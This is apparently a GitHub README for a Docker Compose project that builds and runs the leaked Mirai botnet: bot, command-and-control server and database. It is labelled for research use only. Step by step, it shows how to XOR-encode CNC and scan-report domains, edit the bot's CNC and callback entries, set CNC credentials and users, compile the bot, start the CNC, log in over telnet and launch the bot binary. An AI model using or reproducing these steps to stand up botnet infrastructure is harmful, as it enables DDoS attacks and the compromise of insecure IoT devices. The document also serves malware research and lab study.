# Mirai-Docker

This is a docker compose file that makes it easy to build the [Mirai Botnet](https://en.wikipedia.org/wiki/Mirai_(malware)) development environment, CNC server and database.

Mirai Botnet is a malware that performs DDoS attacks by infecting insecure Internet of Things(IoT) devices.
It was used in a DDoS attack in 2016, and the source code was leaked.
It is now open to [Mirai-Source-Code](https://github.com/jgamblin/Mirai-Source-Code) for malicious code analysis and research purposes. 

미라이 봇넷의 개발 환경과 CNC 서버 및 데이터베이스를 쉽게 구축할 수 있도록 만든 도커 컴포즈 파일입니다.

미라이 봇넷은 보안이 취약한 사물 인터넷(IoT) 기기를 감염시켜 DDoS 공격을 수행하는 악성코드입니다.
2016년 DDoS 공격에 사용되었으며, 소스코드가 유출되어 현재는 악성코드 분석 및 연구 목적으로 [Mirai-Source-Code](https://github.com/jgamblin/Mirai-Source-Code)에 공개되어 있습니다.

**WARNING: FOR RESEARCH PURPOSES ONLY. 연구 목적으로만 사용하세요.**


## 01. Install docker and docker compose
https://docs.docker.com/get-docker/

https://github.com/docker/compose


## 02. Clone this repository
```
$ git clone https://github.com/deunlee/Mirai-Docker
$ cd Mirai-Docker
```


## 03. Build docker containers
```
$ docker compose build
```


## 04. Encrypt your domain
```
$ docker compose run compile ./enc.sh string cnc.mirai.com
XOR'ing 14 bytes of data...
\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
```
```
$ docker compose run compile ./enc.sh string report.mirai.com
XOR'ing 17 bytes of data...
\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
```


## 05. Configure bot
Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
```c
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 30); // cnc.mirai.com
add_entry(TABLE_CNC_PORT, "\x22\x35", 2); // 23

add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 29); // report.mirai.com
add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2); // 48101
```

Edit DNS server in [./src/mirai/bot/resolv.c](./src/mirai/bot/resolv.c)
```c
struct resolv_entries *resolv_lookup(char *domain)
{
    // ...

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1); // <-- here!
    addr.sin_port = htons(53);

    // ...
}
```


## 06. Configure CNC
Edit database config in [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
```go
const DatabaseAddr string   = "mariadb" // "127.0.0.1"
const DatabaseUser string   = "user"
const DatabasePass string   = "this-is-password!"
const DatabaseTable string  = "mirai"
```

Edit prompt path in [./src/mirai/cnc/admin.go](./src/mirai/cnc/admin.go)
```go
headerb, err := ioutil.ReadFile("/home/user/src/mirai/prompt.txt") // <-- here!
```

Edit CNC user in [./src/scripts/db.sql](./src/scripts/db.sql)
```sql
-- CREATE DATABASE mirai; --- comment!

CREATE TABLE `history` (

--- ...

  KEY `prefix` (`prefix`)
);

INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, ''); --- here!
```


## 07. Compile bot and CNC
```
$ docker compose run compile ./build.sh
```


## 08. Run CNC and database server
```
$ docker compose up
```
```
$ telnet 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
я люблю куриные наггетсы
пользователь: mirai-user
пароль: **********

проверив счета... |
[+] DDOS | Succesfully hijacked connection
[+] DDOS | Masking connection from utmp+wtmp...
[+] DDOS | Hiding from netstat...
[+] DDOS | Removing all traces of LD_PRELOAD...
[+] DDOS | Wiping env libc.poison.so.1
[+] DDOS | Wiping env libc.poison.so.2
[+] DDOS | Wiping env libc.poison.so.3
[+] DDOS | Wiping env libc.poison.so.4
[+] DDOS | Setting up virtual terminal...
[!] Sharing access IS prohibited!
[!] Do NOT share your credentials!
Ready
mirai-user@botnet#
```

<!--
```
$ docker compose run compile
mysql -h mariadb -P 3306 -u"user" -p"this-is-password!"
use mirai;
select * from users;
```

```
$ docker compose up mariadb -d
$ docker compose run compile sudo ./src/mirai/debug/cnc
```
```
$ docker compose exec compile telnet 127.0.0.1
```
-->


## 09. Run bot
```
$ docker compose run compile ./src/mirai/debug/mirai.dbg
```
